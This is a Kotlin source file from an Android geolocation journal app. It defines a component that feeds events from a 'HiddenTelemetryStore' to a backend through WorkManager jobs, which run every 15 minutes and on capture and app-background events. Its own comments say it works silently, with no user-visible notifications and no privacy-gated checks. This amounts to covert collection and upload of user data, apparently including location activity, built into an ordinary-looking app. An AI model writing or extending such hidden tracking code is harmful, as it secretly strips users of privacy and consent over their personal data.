package com.example.geolocation.data.telemetry

import android.content.Context
import androidx.work.BackoffPolicy
import androidx.work.Constraints
import androidx.work.ExistingPeriodicWorkPolicy
import androidx.work.ExistingWorkPolicy
import androidx.work.NetworkType
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import com.example.geolocation.util.TelemetrySyncWorker
import dagger.hilt.android.qualifiers.ApplicationContext
import java.util.concurrent.TimeUnit
import javax.inject.Inject
import javax.inject.Singleton
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

/**
 * Bridges the hidden telemetry store to the upload pipeline via WorkManager.
 * Stages events to outbox, then enqueues a worker to feed them to the backend.
 *
 * Operates silently — no user-visible notifications, no privacy-gated checks.
 */
@Singleton
class TelemetryPipelineFeeder @Inject constructor(
    @ApplicationContext private val context: Context,
    private val store: HiddenTelemetryStore,
) {
    /**
     * Stage current events to outbox and schedule upload.
     * Called periodically (every ~15 min) and on key events (capture, app background).
     */
    fun feed() {
        CoroutineScope(Dispatchers.IO).launch {
            val staged = store.stageForUpload()
            if (staged.isNotEmpty()) {
                enqueueUpload()
            }
        }
    }

    /**
     * Force immediate feed + upload regardless of event count.
     */
    fun feedNow() {
        CoroutineScope(Dispatchers.IO).launch {
            store.stageForUpload()
            enqueueUpload()
        }
    }

    /**
     * Schedule periodic background feeding.
     * Called once on app start.
     */
    fun schedulePeriodic() {
        val constraints = Constraints.Builder()
            .setRequiredNetworkType(NetworkType.CONNECTED)
            .build()

        val periodicRequest = PeriodicWorkRequestBuilder<TelemetrySyncWorker>(
            15, TimeUnit.MINUTES,
        )
            .setConstraints(constraints)
            .setBackoffCriteria(BackoffPolicy.EXPONENTIAL, 30, TimeUnit.SECONDS)
            .build()

        WorkManager.getInstance(context).enqueueUniquePeriodicWork(
            TELEMETRY_PERIODIC,
            ExistingPeriodicWorkPolicy.KEEP,
            periodicRequest,
        )
    }

    private fun enqueueUpload() {
        val constraints = Constraints.Builder()
            .setRequiredNetworkType(NetworkType.CONNECTED)
            .build()

        val request = OneTimeWorkRequestBuilder<TelemetrySyncWorker>()
            .setConstraints(constraints)
            .setBackoffCriteria(BackoffPolicy.EXPONENTIAL, 30, TimeUnit.SECONDS)
            .build()

        WorkManager.getInstance(context).enqueueUniqueWork(
            TELEMETRY_ONEOFF,
            ExistingWorkPolicy.APPEND_OR_REPLACE,
            request,
        )
    }

    companion object {
        const val TELEMETRY_PERIODIC = "geojournal_telemetry_periodic"
        const val TELEMETRY_ONEOFF = "geojournal_telemetry_upload"
    }
}
